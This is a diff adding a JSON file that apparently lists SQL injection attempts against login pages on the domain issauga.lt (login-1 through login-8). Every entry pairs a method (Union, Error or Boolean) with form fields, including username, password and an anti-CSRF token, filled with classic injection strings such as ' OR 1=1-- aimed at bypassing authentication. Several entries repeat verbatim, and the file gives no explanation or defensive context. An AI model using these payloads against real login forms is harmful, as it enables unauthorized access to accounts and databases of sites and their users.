@@ -1,0 +1,278 @@
+[
+    {
+        "method": "Union",
+        "url": "https://issauga.lt/login-1/index.php",
+        "payload": {
+            "username": "test' UNION SELECT NULL--",
+            "passwd": "test' UNION SELECT NULL--",
+            "submit": "Submit' UNION SELECT NULL--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Error",
+        "url": "https://issauga.lt/login-1/index.php",
+        "payload": {
+            "username": "test' OR 1=1--",
+            "passwd": "test' OR 1=1--",
+            "submit": "Submit' OR 1=1--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Boolean",
+        "url": "https://issauga.lt/login-1/index.php",
+        "payload": {
+            "username": "test' OR '1'='1'--",
+            "passwd": "test' OR '1'='1'--",
+            "submit": "Submit' OR '1'='1'--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Union",
+        "url": "https://issauga.lt/login-1/index.php",
+        "payload": {
+            "username": "test' UNION SELECT NULL--",
+            "passwd": "test' UNION SELECT NULL--",
+            "submit": "Submit' UNION SELECT NULL--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Error",
+        "url": "https://issauga.lt/login-1/index.php",
+        "payload": {
+            "username": "test' OR 1=1--",
+            "passwd": "test' OR 1=1--",
+            "submit": "Submit' OR 1=1--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Boolean",
+        "url": "https://issauga.lt/login-1/index.php",
+        "payload": {
+            "username": "test' OR '1'='1'--",
+            "passwd": "test' OR '1'='1'--",
+            "submit": "Submit' OR '1'='1'--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Union",
+        "url": "https://issauga.lt/login-1/index.php",
+        "payload": {
+            "username": "test' UNION SELECT NULL--",
+            "passwd": "test' UNION SELECT NULL--",
+            "submit": "Submit' UNION SELECT NULL--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Error",
+        "url": "https://issauga.lt/login-1/index.php",
+        "payload": {
+            "username": "test' OR 1=1--",
+            "passwd": "test' OR 1=1--",
+            "submit": "Submit' OR 1=1--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Boolean",
+        "url": "https://issauga.lt/login-1/index.php",
+        "payload": {
+            "username": "test' OR '1'='1'--",
+            "passwd": "test' OR '1'='1'--",
+            "submit": "Submit' OR '1'='1'--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Union",
+        "url": "https://issauga.lt/login-2/index.php",
+        "payload": {
+            "username": "test' UNION SELECT NULL--",
+            "passwd": "test' UNION SELECT NULL--",
+            "submit": "Submit' UNION SELECT NULL--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Error",
+        "url": "https://issauga.lt/login-2/index.php",
+        "payload": {
+            "username": "test' OR 1=1--",
+            "passwd": "test' OR 1=1--",
+            "submit": "Submit' OR 1=1--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Boolean",
+        "url": "https://issauga.lt/login-2/index.php",
+        "payload": {
+            "username": "test' OR '1'='1'--",
+            "passwd": "test' OR '1'='1'--",
+            "submit": "Submit' OR '1'='1'--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Union",
+        "url": "https://issauga.lt/login-3/index.php",
+        "payload": {
+            "username": "test' UNION SELECT NULL--",
+            "passwd": "test' UNION SELECT NULL--",
+            "submit": "Submit' UNION SELECT NULL--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Error",
+        "url": "https://issauga.lt/login-3/index.php",
+        "payload": {
+            "username": "test' OR 1=1--",
+            "passwd": "test' OR 1=1--",
+            "submit": "Submit' OR 1=1--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Boolean",
+        "url": "https://issauga.lt/login-3/index.php",
+        "payload": {
+            "username": "test' OR '1'='1'--",
+            "passwd": "test' OR '1'='1'--",
+            "submit": "Submit' OR '1'='1'--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Union",
+        "url": "https://issauga.lt/login-5/index.php",
+        "payload": {
+            "username": "test' UNION SELECT NULL--",
+            "passwd": "test' UNION SELECT NULL--",
+            "submit": "Submit' UNION SELECT NULL--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Error",
+        "url": "https://issauga.lt/login-5/index.php",
+        "payload": {
+            "username": "test' OR 1=1--",
+            "passwd": "test' OR 1=1--",
+            "submit": "Submit' OR 1=1--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Boolean",
+        "url": "https://issauga.lt/login-5/index.php",
+        "payload": {
+            "username": "test' OR '1'='1'--",
+            "passwd": "test' OR '1'='1'--",
+            "submit": "Submit' OR '1'='1'--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Union",
+        "url": "https://issauga.lt/login-6/index.php",
+        "payload": {
+            "username": "test' UNION SELECT NULL--",
+            "passwd": "test' UNION SELECT NULL--",
+            "submit": "Submit' UNION SELECT NULL--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Error",
+        "url": "https://issauga.lt/login-6/index.php",
+        "payload": {
+            "username": "test' OR 1=1--",
+            "passwd": "test' OR 1=1--",
+            "submit": "Submit' OR 1=1--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Boolean",
+        "url": "https://issauga.lt/login-6/index.php",
+        "payload": {
+            "username": "test' OR '1'='1'--",
+            "passwd": "test' OR '1'='1'--",
+            "submit": "Submit' OR '1'='1'--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Union",
+        "url": "https://issauga.lt/login-7/index.php",
+        "payload": {
+            "username": "test' UNION SELECT NULL--",
+            "passwd": "test' UNION SELECT NULL--",
+            "submit": "Enter' UNION SELECT NULL--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Error",
+        "url": "https://issauga.lt/login-7/index.php",
+        "payload": {
+            "username": "test' OR 1=1--",
+            "passwd": "test' OR 1=1--",
+            "submit": "Enter' OR 1=1--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Boolean",
+        "url": "https://issauga.lt/login-7/index.php",
+        "payload": {
+            "username": "test' OR '1'='1'--",
+            "passwd": "test' OR '1'='1'--",
+            "submit": "Enter' OR '1'='1'--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Union",
+        "url": "https://issauga.lt/login-8/index.php",
+        "payload": {
+            "username": "test' UNION SELECT NULL--",
+            "passwd": "test' UNION SELECT NULL--",
+            "passcode": "test' UNION SELECT NULL--",
+            "anticsrf": "63e459c6c4a64146d2f592ec9488598b' UNION SELECT NULL--",
+            "submit": "Enter' UNION SELECT NULL--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Error",
+        "url": "https://issauga.lt/login-8/index.php",
+        "payload": {
+            "username": "test' OR 1=1--",
+            "passwd": "test' OR 1=1--",
+            "passcode": "test' OR 1=1--",
+            "anticsrf": "63e459c6c4a64146d2f592ec9488598b' OR 1=1--",
+            "submit": "Enter' OR 1=1--"
+        },
+        "db_type": "mysql"
+    },
+    {
+        "method": "Boolean",
+        "url": "https://issauga.lt/login-8/index.php",
+        "payload": {
+            "username": "test' OR '1'='1'--",
+            "passwd": "test' OR '1'='1'--",
+            "passcode": "test' OR '1'='1'--",
+            "anticsrf": "63e459c6c4a64146d2f592ec9488598b' OR '1'='1'--",
+            "submit": "Enter' OR '1'='1'--"
+        },
+        "db_type": "mysql"
+    }
+]
